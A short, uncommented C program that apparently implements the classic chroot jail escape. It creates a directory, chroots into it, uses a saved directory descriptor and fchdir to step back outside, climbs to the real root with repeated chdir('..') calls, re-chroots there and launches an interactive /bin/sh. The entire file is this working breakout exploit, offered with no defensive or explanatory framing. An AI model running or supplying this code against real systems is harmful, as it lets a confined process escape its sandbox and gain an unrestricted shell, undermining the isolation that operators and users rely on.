#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdlib.h>

#define NEED_FCHDIR 0

#define TEMP_DIR "waterbuffalo"

int main() {
	int x;
	int dome=0; 
#ifdef NEED_FCHDIR
	int dir_fd; /* File descriptor to directory */
#endif
	struct stat sbuf;

	if (stat(TEMP_DIR, &sbuf)<0) {
		if (errno==ENOENT) {
			if(mkdir(TEMP_DIR,0755)<0) {
				fprintf(stderr, "Failed to create %s - %s\n", TEMP_DIR, strerror(errno));
				exit(1);
			}
		} else {
			fprintf(stderr, "Failed to stat %s - %s\n", TEMP_DIR, strerror(errno));
			exit(1);
		}
	} else if (!S_ISDIR(sbuf.st_mode)) {
		fprintf(stderr, "Error - %s is not a directory!\n", TEMP_DIR);
		exit(1);
	}


#ifdef NEED_FCHDIR
	if ((dir_fd=open(".", O_RDONLY))<0) {
		fprintf(stderr, "Failed to open\".\" for reading - %s\n",
			strerror(errno));
		exit(1);
	}
#endif

	if (chroot(TEMP_DIR)<0) {
		fprintf(stderr, "Failed to chroot to %s - %s\n", TEMP_DIR,
			strerror(errno));
		exit(1);
	}
#ifdef NEED_FCHDIR
	if (fchdir(dir_fd)<0) {
		fprintf(stderr, "Failed to fchdir - %s\n",
			strerror(errno));
		exit(1);
	}
	close(dir_fd);
#endif

	for(x=0;x<1024;x++) {
		chdir("..");
	}
	chroot(".");

	if (execl("/bin/sh","-i",NULL)<0) {
		fprintf(stderr, "Failed to exec - %s\n",strerror(errno));
		exit(1);
	}
}
		
